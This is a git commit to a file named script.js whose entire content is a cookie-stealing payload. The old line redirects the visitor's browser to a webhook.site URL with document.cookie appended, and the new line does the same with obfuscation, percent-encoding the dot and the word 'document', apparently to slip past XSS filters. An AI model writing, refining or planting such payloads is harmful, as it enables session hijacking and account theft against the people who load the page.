2a4929d03277d3158c87b41bb04fb18e903c512e
Andreq Barkov <43047614+Jesiontrop@users.noreply.github.com>
2025-01-31 22:48:36 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-document.location='https://webhook.site/9ab98703-6ffc-4e42-b8f5-0ddbc1b7648b?c='+document.cookie
+location=("//webhook"+decodeURIComponent("%2E")+"site/9ab98703-6ffc-4e42-b8f5-0ddbc1b7648b?c="+window[decodeURIComponent("%64%6f%63%75%6d%65%6e%74")]["cookie"])
